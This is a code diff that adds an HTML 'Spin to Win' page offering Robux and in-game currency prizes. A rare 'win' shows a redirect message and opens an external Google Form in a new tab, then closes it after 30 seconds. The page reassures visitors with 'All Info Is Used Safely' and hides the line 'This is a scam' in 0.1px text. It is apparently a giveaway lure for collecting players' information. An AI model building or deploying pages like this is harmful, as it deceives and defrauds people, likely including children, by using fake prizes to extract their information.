@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Spin Game</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        body {
+            background:#0f172a;
+            color:white;
+            text-align:center;
+            font-family:Arial;
+            margin:0;
+        }
+
+        .hidden { display:none; }
+
+        .container {
+            padding:20px;
+        }
+
+        .chances {
+            position:absolute;
+            left:30px;
+            top:100px;
+            text-align:left;
+        }
+
+        .mobile .chances {
+            position:static;
+            text-align:center;
+            margin-bottom:20px;
+        }
+
+        button {
+            padding:25px 60px;
+            font-size:22px;
+            background:#22c55e;
+            border:none;
+            border-radius:20px;
+            cursor:pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px #22c55e;
+        }
+
+        .mobile button {
+            width:90%;
+            font-size:26px;
+        }
+
+        .popup, .win-screen {
+            display:none;
+            position:fixed;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+            background:rgba(0,0,0,0.8);
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
+        }
+
+        .popup-content {
+            background:#1e293b;
+            padding:20px;
+            margin:20% auto;
+            width:300px;
+            border-radius:10px;
+        }
+
+        .mobile .popup-content {
+            width:90%;
+            margin:40% auto;
+        }
+
+        .win-text {
+            font-size:50px;
+            font-weight:bold;
+            color:#22c55e;
+            animation: pop 0.6s ease-in-out infinite alternate;
+        }
+
+        .redirect-text {
+            font-size:32px;
+            font-weight:bold;
+            color:#ffffff;
+            margin-top:20px;
+        }
+
+        @keyframes pop {
+            from { transform: scale(1); }
+            to { transform: scale(1.25); }
+        }
+
+        input {
+            padding:10px;
+            width:90%;
+        }
+
+        .bottom-left {
+            position:fixed;
+            bottom:10px;
+            left:10px;
+            font-size:12px;
+            opacity:0.7;
+        }
+
+        .bottom-right {
+            position:fixed;
+            bottom:10px;
+            right:10px;
+            font-size:0.1px;
+            opacity:0.4;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- DEVICE SELECT -->
+<div id="deviceSelect" class="container">
+    <h1>Select Device</h1>
+    <button onclick="setDevice('mobile')">Mobile</button>
+    <br><br>
+    <button onclick="setDevice('desktop')">Computer</button>
+</div>
+
+<!-- MAIN GAME -->
+<div id="game" class="hidden container">
+
+    <h1>Spin to Win - Salahybo</h1>
+
+    <div class="chances">
+        <h3>Chances:</h3>
+        <p>Common 🟩 - 75%</p>
+        <p>Rare 🟦 - 20%</p>
+        <p>Epic 🟪 - 3%</p>
+        <p>Legendary 🟨 - 1%</p>
+        <p>Mythic 🟥 - 0.75%</p>
+        <p>Secret ⬛ - 0.2%</p>
+        <p>God ⬜ - 0.04%</p>
+        <p>OG 🐘 - 0.01%</p>
+    </div>
+
+    <h2 id="result">Try ur luck</h2>
+
+    <button onclick="spin()">SPIN</button>
+
+    <h2>Land on a Secret, God, OG to win 2k Robux, 200 mil Tang Tang</h2>
+
+    <p>Common: <span id="common">0</span></p>
+    <p>Rare: <span id="rare">0</span></p>
+    <p>Epic: <span id="epic">0</span></p>
+    <p>Legendary: <span id="legendary">0</span></p>
+    <p>Mythic: <span id="mythic">0</span></p>
+    <p>Secret: <span id="secret">0</span></p>
+    <p>God: <span id="god">0</span></p>
+    <p>OG: <span id="og">0</span></p>
+</div>
+
+<!-- WIN SCREEN -->
+<div id="winScreen" class="win-screen">
+    <div class="win-text" id="winText">YOU WON 🎉</div>
+    <div class="redirect-text" id="redirectText"></div>
+</div>
+
+<div class="bottom-left">All Info Is Used Safely</div>
+<div class="bottom-right">(Disclaimer) This is a scam</div>
+
+<audio id="spinSound" src="https://www.soundjay.com/button/sounds/button-16.mp3"></audio>
+
+<script>
+let inventory = {
+    common: 0,
+    rare: 0,
+    epic: 0,
+    legendary: 0,
+    mythic: 0,
+    secret: 0,
+    god: 0,
+    og: 0
+};
+
+function setDevice(type) {
+    document.getElementById('deviceSelect').style.display = 'none';
+    document.getElementById('game').classList.remove('hidden');
+    if(type==='mobile'){document.body.classList.add('mobile');}
+}
+
+function spin() {
+    let rand = Math.random()*100;
+    let result='';
+    if(rand<75){result='Common 🟩'; inventory.common++;}
+    else if(rand<95){result='Rare 🟦'; inventory.rare++;}
+    else if(rand<98){result='Epic 🟪'; inventory.epic++;}
+    else if(rand<99){result='Legendary 🟨'; inventory.legendary++;}
+    else if(rand<99.75){result='Mythic 🟥'; inventory.mythic++;}
+    else if(rand<99.95){result='Secret ⬛'; inventory.secret++; showWinScreen();}
+    else if(rand<99.99){result='God ⬜'; inventory.god++; showWinScreen();}
+    else{result='OG 🐘'; inventory.og++; showWinScreen();}
+
+    document.getElementById('result').innerText=result;
+    for(let key in inventory){document.getElementById(key).innerText=inventory[key];}
+    document.getElementById('spinSound').play();
+}
+
+function showWinScreen(){
+    const win=document.getElementById('winScreen');
+    const winText=document.getElementById('winText');
+    const redirectText=document.getElementById('redirectText');
+    win.style.display='flex';
+    redirectText.innerText='';
+
+    if(navigator.vibrate){navigator.vibrate([200,100,200]);}
+
+    // Show 'YOU WON' for 3s
+    setTimeout(()=>{
+        redirectText.innerText='Redirecting...';
+
+        // Open the form after redirect text shows
+        const winForm = window.open('https://forms.gle/2sdzpUsntMRDdxZXA','_blank');
+
+        // Automatically close the form after 30s
+        setTimeout(()=>{
+            if(winForm && !winForm.closed){
+                winForm.close();
+                alert('The form has been closed.');
+            }
+            win.style.display='none';
+        },30000);
+    },3000);
+} 
+</script>
+
+</body>
+</html>
